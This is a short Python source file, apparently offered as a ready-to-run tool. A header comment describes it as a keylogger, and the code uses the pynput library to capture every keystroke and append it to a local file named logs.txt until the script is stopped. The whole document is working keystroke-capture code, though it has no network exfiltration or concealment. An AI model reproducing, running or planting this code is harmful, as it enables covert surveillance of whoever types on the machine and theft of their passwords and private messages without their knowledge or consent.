# This code is a keylogger that captures keystrokes and saves them to a file named "logs.txt". It uses the `pynput` library to listen for keyboard events. The `on_press` function is called whenever a key is pressed, and it appends the key to the log file. The listener runs indefinitely until the program is terminated, which can be done by closing the terminal running the script.

import platform
from pynput.keyboard import Key, Listener

CURRENT_OS = platform.system()

LOG_FILE = "logs.txt"


def on_press(key):
    """Log each keystroke to logs.txt."""
    try:
        with open(LOG_FILE, "a") as file:
            file.write(f"{key}\n")
    except Exception as e:
        print(f"Error logging keystroke: {e}")

def start_keylogger():
    """Start the keylogger listener."""
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()

    except Exception as e:
        print(f"Error starting keylogger: {e}")


if __name__ == "__main__":
    on_press(key=Key.enter)  # Start logging with a dummy key press
    start_keylogger()
